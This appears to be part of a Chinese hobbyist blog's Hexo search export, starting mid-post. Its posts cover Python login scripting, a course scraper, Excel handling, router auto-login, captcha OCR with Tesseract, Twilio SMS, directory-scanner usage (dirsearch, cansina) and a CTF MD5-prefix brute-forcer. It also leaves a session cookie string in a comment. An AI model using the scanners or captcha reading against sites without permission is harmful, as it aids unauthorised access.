'username':'xxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'&#125;r= requests.get('http://www.xxxxx.com/loginLab.do',data=datas)print(r.text) 直接在登录页面post没成功，抓包发现 先是Post一个去/getRsaOfKey.action 返回一些字符串 接着 才是真的 POST /Login.action 发现它post过去的密码是经过加密了的，而且还POST了两个认证参数 1&amp;validateCode=&amp;rtnJson=true 所以我们构造POST的data为 123456datas=&#123; &apos;username&apos;:&apos;xxxxxxxxxxxx&apos;, &apos;password&apos;:&apos;xxxxxxxxxxxxxxxxxxxxxxxxx&apos;, &apos;validateCode&apos;:&apos;true&apos;, &apos;rtnJson&apos;:&apos;true&apos;,&#125; 因为是先POST去 /getRsaOfKey.action拿到加密后的password，然后POST /Login.action 所以我直接request请求/Login.action 然后再request一下自己的主页看看登录次数 检查一下当前的登录次数：264 运行代码： 再运行一次： 登录成功了，以后登录就只需要运行下面短短20行左右代码，感谢合天小姐姐提醒我填了这个坑 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/24 13:02# @Author : Lhaihai# @File : Request模拟登陆xxxx.py# @Software: PyCharm""" Description : 使用request来登陆"""import requestsfrom bs4 import BeautifulSoupdatas=&#123; 'username':'xxxxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxx', 'validateCode':'true', 'rtnJson':'true',&#125;url = 'http://www.xxxxxxx.com/Login.action'myindexUrl = 'http://www.xxxxxxxx.com/profile.do?u=xxxxxxxxxxxx' #我的主页urlsession = requests.session()#模拟登陆r = session.post(url,data=datas)#输出响应报文状态码print(r.status_code)#请求访问主页r2 = session.get(myindexUrl)bs = BeautifulSoup(r2.text,'lxml')for Msg in bs.find_all(class_='logoRight'): for ms in Msg.find_all(name='p'): print(ms.string) 写得挺长的，或许有些错误。虚心请教各位大表哥，如果发现错误，请指点一下小弟。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取ichunqiu的课程列表]]></title>
    <url>%2F2018%2F04%2F16%2F%E7%88%AC%E5%8F%96ichunqiu%E7%9A%84%E8%AF%BE%E7%A8%8B%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[0x00 模拟浏览器登录0x01 爬取课程数据0x02 把课程数据保存在Excel表格爬取了ichunqiu的全部课程，把课程名字，费用，课程时间，学习人数保存到Excel表格里 最后统计了一下，如果购买ichunqiu的全部360门课程，需要 13835 元，好贵，可恶。还好强网杯送了VIP 每门课的学习人数加起来有 ： 20338110 对你没看错，两千多万，:-( 看来很多大表哥都在认真学习，我需要继续加油 现在有点晚了，有空再详细写一下 把代码奉上:） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 20:04# @Author : Lhaihai# @File : 爬取ichunqiu的课程.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 看了ADO大哥的Python视频，特来练练手"""import timefrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsimport openpyxldef main(): url = 'https://user.ichunqiu.com/login?r=https%3A%2F%2Fwww.ichunqiu.com%2F' chrome_options = Options() chrome_options.add_argument('--headless') chrome_options.add_argument('--disable-gpu') browser = webdriver.Edge() browser.maximize_window() browser.implicitly_wait(10) browser.get(url) phonenumber = browser.find_element_by_id('username') phonenumber.send_keys('132xxxxxxxx') #ichunqiu用户名 password = browser.find_element_by_id('password') password.send_keys('xxxxxxxx') #密码 siginbutton = browser.find_elements_by_tag_name('button') siginbutton[1].click() zhishitixi = browser.find_element_by_link_text('知识体系') zhishitixi.click() pagesizetext = browser.find_element_by_class_name('paginmsg') pagesize = int(pagesizetext.text[1:3]) print(pagesize) time.sleep(5) fileName = 'ichunqiuCourse.xlsx' wb = openpyxl.load_workbook(fileName) sheet = wb['Sheet1'] coursenum = 1 for i in range(pagesize): print('第%s页：'%(i+1)) try: courses = browser.find_elements_by_class_name('coursedesc') except: courses = browser.find_elements_by_class_name('coursedesc') for course in courses: coursenum += 1 temp = str(course.text).split('\n') q = 0 for k in ['A','B','C','D']: sheet[k+str(coursenum)]=temp[q] q +=1 print(temp[0]+' '+temp[1]+' '+temp[2]+' '+temp[3]) time.sleep(30) forward = browser.find_element_by_link_text('下一页') forward.click() wb.save(fileName) time.sleep(10) browser.close() # headers = &#123; # 'Host': 'www.ichunqiu.com', # 'Upgrade-Insecure - Requests': '1', # 'User-Agent': 'Mozilla / 5.0(Windows NT 10.0; WOW64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 65.0 .3325 .162 Safari / 537.36', # 'Cookie':'jsluid = db12a88242060be7332ceb595406d146; UM_distinctid = 160 f2bab2de3e - 075 c93693782be - 5 a442916 - 144000 - 160 f2bab2df60c; pgv_pvi = 3608032256; chkphone = acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; bdshare_firstime = 1523760890619; CNZZDATA1262179648 = 1767882761 - 1515897679 - https % 253 A % 252 F % 252 Fwww.baidu.com % 252 F % 7 C1523878517; pgv_si = s8916923392; Hm_lvt_2d0601bd28de7d49818249cf35d95943 = 1523684986, 1523758601, 1523780794, 1523879628; robot = 1; Hm_lvt_9104989ce242a8e03049eaceca950328 = 1523512155, 1523544753, 1523758659, 1523879645; Hm_lpvt_9104989ce242a8e03049eaceca950328 = 1523879645; Hm_lvt_1a32f7c660491887db0960e9c314b022 = 1523512155, 1523544754, 1523758659, 1523879645; Hm_lpvt_1a32f7c660491887db0960e9c314b022 = 1523879645; browse = CFlZTVQKAE9cU1FMW0oaT1haUldcQVhNRFNbWFxBSUdaWVxAVEBbV1IKUkBYQFxGUhBSRFdLS0dZUlBYXkJER1lDWkZURVxPWldKTgdLXE1dUV9OHUtYTFNBWkVfSURFXU5YTU5BUE9dW1JEXVNSHFNWWUVYSFIGU1JRT0xDWURRTlhGQ0NQVVlTUkVdS1tDS1gBT1tGUUJQWBtPX0hTV1tTWU1DQV1YWFRIRFdLXEFTV1xXVRhTQFhXWEBVAlNEUFlKR15AUVhZV0VFVlFbRFNWUU9fQ0tOAFldRlpCXk4aWVlMVFNbRVhbRUVaXFhCSVFYT15EU0FfQVMcVERdRVBQUwZUQFBPS1FYRFZcWUFEUl5VX0FTQF1ZWkVMSgBPXFVRRF9KGk9YWlJXXEFYTURTXFheSElEWllbRVRFXVdSClJAVkJaRlIQUkRXS0tHWVJQWF5FRERYQ1pFVEBQT1hWSk4HS1xNXlpRTh1LWExTQVpFX0lERV1OWUVOQFxPWFZSQFdTUhxTVFBOHUtYTFNBWkVfSURFXU5ZRU5AXE9YVVJBWFNSHFNXX0BVAlNEUFlKR15AUVhZV0VEXlFbRFNWXk9eQUtOAFldQVlCXE4aWVlMVFNbRVhbRUVaXFhFSVFZT1tHU0VdQVMcVERRQVhWUwZUQFBPS1FYRFZcWUFEUllVX0NTRl1ZWkVMSgBPX1JbTV1KGk9YWlJXXEFYTURTXFhfQ0lEXVlZRFRFXVdSClJDX0ReQlIQUkRXS0tHWVJQWF5FRERaQ1lGVEVQT1tWSk4HS19EX1dRTh1LWExTQVpFX0lERV1OWUNOQFlPWlZSRFhTUgg; ci_session = 61 ef25a31707ca2e4aca5c072f778ef4068bcd64; Hm_lpvt_2d0601bd28de7d49818249cf35d95943 = 1523880868' # &#125; # # r = requests.get(url) # r.status_code # r.encoding = 'utf-8' # print(r.text)if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['python操作Excel']]></title>
    <url>%2F2018%2F04%2F16%2Fpython%E6%93%8D%E4%BD%9CExcel%2F</url>
    <content type="text"><![CDATA[0x00 安装openpyxlpip install openpyxl 我直接使用pycharm在当前项目安装了 0x01 读写Excel打开Excel文档1wb = openpyxl.load_workbook('ichunqiuCourse.xlsx') 取得工作表123wb.sheetnames #获得Excel每个表的名字sheet = wb['Sheet1'] #获得工作表，对工作表进行操作print(sheet['A1'].value) #获得Sheet1表格A1单元格的值 测试下面代码 12345678import openpyxlwb = openpyxl.load_workbook(&apos;ichunqiuCourse.xlsx&apos;)print(&apos;Excle的工作表有：&apos;+str(wb.sheetnames))sheet = wb[&apos;Sheet1&apos;]for i in [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]: print(sheet[str(i)+&apos;1&apos;].value+&apos;:&apos;+sheet[str(i)+&apos;2&apos;].value) 向Excel写入数据12345sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 成功写入数据 0x02完整代码 123456789101112131415161718192021222324#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 22:08# @Author : Lhaihai# @File : controlExcel.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 使用python读写Excel"""import openpyxlwb = openpyxl.load_workbook('ichunqiuCourse.xlsx')print('Excle的工作表有：'+str(wb.sheetnames))sheet = wb['Sheet1']for i in ['A','B','C','D']: print(sheet[str(i)+'1'].value+':'+sheet[str(i)+'2'].value)sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 注意：我看的《Python编程快速上手——让繁琐工作自动化》这本书，也许是这本书有点旧了，里面刚开始用的是 get_sheet_names 和get_sheet_by_name ，但是PyCharm会warning，提示建议使用 wb.sheetnames和wb[sheetname] 123DeprecationWarning: Call to deprecated function get_sheet_names (Use wb.sheetnames)DeprecationWarning: Call to deprecated function get_sheet_by_name (Use wb[sheetname]). 我搜到有人使用xlrd、xlwt包来操作Excel，但http://www.python-excel.org/推荐使用`openpyxl` 我也推荐用openpyxl ，因为它比那两个包方便很多。 至于一些字体大小也颜色也是可以设置的，就不写了，如果要用到就翻书吧。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['小米路由器开机自动登录Dr.COM']]></title>
    <url>%2F2018%2F04%2F16%2F%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95Dr-COM%2F</url>
    <content type="text"><![CDATA[0x00 小米路由开启SSH访问1.检查是否为开发版 2.如果不是开发版，到下面网址下在rom升级http://www1.miwifi.com/miwifi_download.html next 3.然后网页打开http://miwifi.com/cgi-bin/luci/web 进入管理页面手动升级 4.给小米路由安装SSH管理工具，具体看下面这篇百度经验，还是挺容易的https://jingyan.baidu.com/article/a24b33cd1080f719fe002b8e.html 注意：​ 在用SSH连接小米路由器时，不同路由器的IP地址可能不同，查看小米路由器的，下图圈起来来的IP地址就是SSH登录时的服务器IP，用户名是：root，密码：下载小米路由器SSH工具的页面有 0x01 测试Dr.com具体步骤查看下方网址： https://github.com/drcoms/drcom-generic/wiki/d%E7%89%88%E7%AE%80%E7%95%A5%E4%BD%BF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E 1.使用wireshark在官方客户端登录前开始截包，做一次完整的截包动作然后登出，保存为 wireshark截包文件, 比如 dr.pcapng (扩展名为pcapng)。 2.下载 d版配置生成器, 将其与第一步的截包文件放到同一个目录下，并且将第17行的 filename = &#39;3.pcapng&#39; 中的 dr.pcapng 改为第一步保存的文件名。 3.进入命令提示符(或shell)进入 drcom_d_config.py 所在目录，输入 python drcom_d_config.py &gt; config.txt ，打开 config.txt 根据提示，新建drcom.conf文件，复制类在似下方段落保存在drcom.conf文件中 123456789101112131415server = &apos;119.39.119.2&apos; //服务器ip地址username=&apos;02xxxxxxxxx@zndx&apos; //xxx是你的学号password=&apos;&apos;CONTROLCHECKSTATUS = &apos;\x20&apos;ADAPTERNUM = &apos;\x08&apos;host_ip = &apos;10.0.7.24&apos; //小米路由器的ip地址IPDOG = &apos;\x01&apos;host_name = &apos;GILIGILIEYE&apos;PRIMARY_DNS = &apos;192.168.31.1&apos;dhcp_server = &apos;0.0.0.0&apos;AUTH_VERSION = &apos;\x2d\x00&apos;mac = 0x000000000000host_os = &apos;NOTE7&apos;KEEP_ALIVE_VERSION = &apos;\xd8\x02&apos;ror_version = True 4.在自己电脑测试 保存https://github.com/drcoms/drcom-generic项目的latest-wired.py 到自己电脑（发现原来有python3版本的呀，苦逼的我为了用python2特地修改了下系统环境变量） 注意latest-wired.py使用python2执行，latest-wired-python3.py应该可以用python3执行，看官可以自己试一下，我没有测试。 傻傻的我直接打在windows打linux命令了 改一改绑定的端口就可以了，在73行 看到类似提示，那就是可以用了，这时候并没有成功连接Dr.com的服务器，因为我这是候还没有在drcom.conf配置文件的password打上我联通账号的密码。将 latest-wired.py 改名为 drcom.py 接下来就到小米路由器上测试了。 0x02设置小米路由器开机启动Dr.com下方网址的大哥写得很详细了，我就补充一下一些需要注意的地方： http://bbs.xiaomi.cn/t-12871940 1.配置开机自动运行 Dr. COM 登录脚本/etc/inittab可以使用WinSCP直接操作，不熟悉vim命令的话 使用vim的过程十分痛苦（有点反人类）,复制::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 到inittab最后一行，Ctrl+S保存，退出 2.放配置文件 0x03 效果reboot路由器后，ps查看。等个几秒钟，就连上网了 0x04 后记昨晚弄好没有问题，早上起来用手机连上WiFi又弹出联通页面了。 putty连接小米路由器（小强root@XiaoQiang:~#)，刚开始我以为是联通服务器有问题掉线了，我偶尔遇到过Dr.com客户端断开连接，然后reboot重启下路由器。 再ps查看一下，咦，怎么没有我可爱的python进程（登录哆点的脚本） 最后检查了etc/inittab，没错就是添加 ::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 这条语句的文件，发现这条语句没了，emmmm 加上去，再reboot一下就连上网了。 我猜可能是路由器自动恢复？还是刚好被我遇到了这个奇葩bug？ 后续想着设置一下每天自动执行 killall python，Linux是有cron个工具，类似于windows的task scheduler，可以设置定时启动某任务。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
      <tags>
        <tag>小米路由器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python识别验证码]]></title>
    <url>%2F2018%2F04%2F15%2Fpython%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei.cn/archives/297.html) 首先需要安装pytesseract库还有图像处理的PILLOW库了 12pip install pytesseractpip install PILLOW 然后要安装一个Tesseract-OCR软件。这个软件是由Google维护的开源的OCR软件。下载地址：百度网盘（密码：5m3d）。再在Windows下配置一下环境变量。 0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。https://blog.csdn.net/jacke121/article/details/75443785 1pytesseract.pytesseract.tesseract_cmd = r&apos;C:\Program Files (x86)\Tesseract-OCR\tesseract.exe&apos; 0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata1pytesseract.pytesseract.TesseractError: (1, &apos;Error opening data file \\Program Files (x86)\\Tesseract-OCR\\eng.traineddata Please make sure the TESSDATA_PREFIX environment variable is set to your &quot;tessdata&quot; directory. Failed loading language \&apos;eng\&apos; Tesseract couldn\&apos;t load any languages! Could not initialize tesseract.&apos;) 在.py 文件配置中指定 tessdata-dir 12tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"'text = pytesseract.image_to_string(image,lang='chi_sim',config=tessdata_dir_config) 0x03 供上代码12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python3# -*- coding: utf-8 -*-# @Date : 2018-04-15 13:18:36# @Author : Lhaihai ($&#123;email&#125;)# @Link : http://blog.Lhaihai.wang# @Version : $Id$import pytesseractfrom PIL import Imagedef get_bin_table(threshold = 230): # 获取灰度转二值的映射table table = [] for i in range(256): if i &lt; threshold: table.append(0) else: table.append(1) return tabledef main(): pytesseract.pytesseract.tesseract_cmd = r'D:\Program Files (x86)\Tesseract-OCR\tesseract.exe' image = Image.open('1.jpg') # image.show() #打开图片1.jpg #imgry = image.convert('L') # 转化为灰度图，虽然说转为灰度图识别更好的一点，但随你喜欢用不用 #table = get_bin_table() #out = imgry.point(table, '1') tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"' text = pytesseract.image_to_string(image,lang='eng',config=tessdata_dir_config) # fil = filter(str.isdigit, text) # new_text = '' # for i in fil: # new_text += i print(text)if __name__ == '__main__': main() 有时候可以识别出来，有时候识别不了，时好时坏吧 参考地址： https://blog.csdn.net/Sioon_XUX/article/details/78617160 http://www.cnblogs.com/zhongtang/tag/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/ https://blog.csdn.net/kiramario/article/details/53781369 https://github.com/tesseract-ocr/tesseract/wiki/4.0-with-LSTM#400-alpha-for-windows https://github.com/tesseract-ocr/tesseract/wiki/Data-Files https://github.com/madmaze/pytesseract https://github.com/tesseract-ocr/tesseract https://github.com/tesseract-ocr/tesseract/wiki]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python+twilio发送短信]]></title>
    <url>%2F2018%2F04%2F14%2Fpython-twilio%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[注册Twilio账号访问http://twilio.com/并填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。现在，就可以用twilio模块向这个电话号码发送短信了。 1、获取一个Twilio电话号码：https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/ 2、要验证接收短信的手机号码，要不然就会报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 到这个网址验证手机号码：https://www.twilio.com/console/phone-numbers/verified 可以发送短信验证码或者打电话输入验证码 3、官方文档https://www.twilio.com/docs/libraries/python 发送短信123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", from_="+15017250604", body="Hello from Python!")print(message.sid) 效果如下： tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在导入twilio库的时候会失败，提示unuseful rest 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3:封装一下函数，（并且放在python.exe当前目录，方便其它python文件调用），就方便使用了 1sendMessage('tophonenumber','Happy to do this') tip4：github项目 https://github.com/twilio/twilio-python/ 打电话12345678910from twilio.rest import Clientaccount = "ACXXXXXXXXXXXXXXXXX"token = "YYYYYYYYYYYYYYYYYY"client = Client(account, token)call = client.calls.create(to="9991231234", from_="9991231234", url="http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient")print(call.sid) 只能打电话过来，说几句英语，不能沟通 Handling a call using TwiML（偷个懒直接从github复制） To control phone calls, your application needs to output TwiML. Use twilio.twiml.Response to easily create such responses. 12345from twilio.twiml.voice_response import VoiceResponser = VoiceResponse()r.say("Welcome to twilio!")print(str(r)) 最后还是不知道怎么实现打电话双向通话(；へ：) 参考链接： https://baijiahao.baidu.com/s?id=1593431889367189831&amp;wfr=spider&amp;for=pc]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 学习笔记]]></title>
    <url>%2F2018%2F04%2F13%2Fhexo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[参考链接： Hexo博客教程(一):Hexo的前期部署：https://www.jianshu.com/p/9f04ee6371ce Hexo博客教程(二):基本功能和网站优化：https://www.jianshu.com/p/2a70262295e4 Hexo博客教程(三):参考资料https://www.jianshu.com/p/8f727b4c3cd1 设置访问次数统计不蒜子统计 http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F13%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>good</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站目录结构扫描器]]></title>
    <url>%2F2018%2F03%2F13%2F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[0x00 cansinaInstall12345pip install --user requests[security](try removing --user and install with sudo in case of errors)git clone --depth=1 https://github.com/deibit/cansina Fast useUse Python 3 (works on Python 2 too, but 3 is advisable) 1$ python3 cansina.py -u &lt;site_url&gt; -p &lt;payload_file&gt; 0x01 dirsearchinstall(need Python 3.X)Linux: 123git clone https://github.com/maurosoria/dirsearch.gitcd dirsearch/./dirsearch.py -u 目标网址 -e * Windows: https://github.com/maurosoria/dirsearch/archive/master.zip Fast use12./dirsearch.py -u 目标网址 -e *./dirsearch.py -u 目标网址 -e php| grep 200 !dirsearch]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>python Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF笔记]]></title>
    <url>%2F2018%2F03%2F11%2FN1CTF%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[https://3wapp.github.io/ http://blog.csdn.net/lacoucou/article/details/72355346 Dockerfile easy php substr(md5(?), 0, 5)=== de426 substr() 函数返回字符串的一部分。 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 语法12substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 http://www.beesfun.com/2017/03/21/CTF%E4%B9%8BMD5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83/ submd5.py 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) if md5.hexdigest()[start: start+str_len] == substr: print rnds stop_event.set()if __name__ == '__main__': substr = sys.argv[1].strip() start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() 用法： 1234$ python submd5.py "3d4f4"SponhjOhIZ30IaM1fweb$ python submd5.py "3df4" 2G8tr6VhonA1z3xJdaGBu]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub hexo建站笔记]]></title>
    <url>%2F2018%2F03%2F11%2FGitHub-hexo%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[有用的链接：12https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.mdhttp://theme-next.iissnan.com/getting-started.html 0x01 Cannot GET /tags/执行 1$ hexo new page tags 之后，要修改tags文件下的index.md文件 https://www.zhihu.com/question/29017171 0x02 这里有两篇帮你不需要什么成本，搭建好一个功能完备的博客： 如何搭建一个独立博客——简明Github Pages与Hexo教程 https://www.jianshu.com/p/05289a4bc8b2 hexo 博客小功能添加-评论、相册、字数统计… https://www.jianshu.com/p/f5c184047e72]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
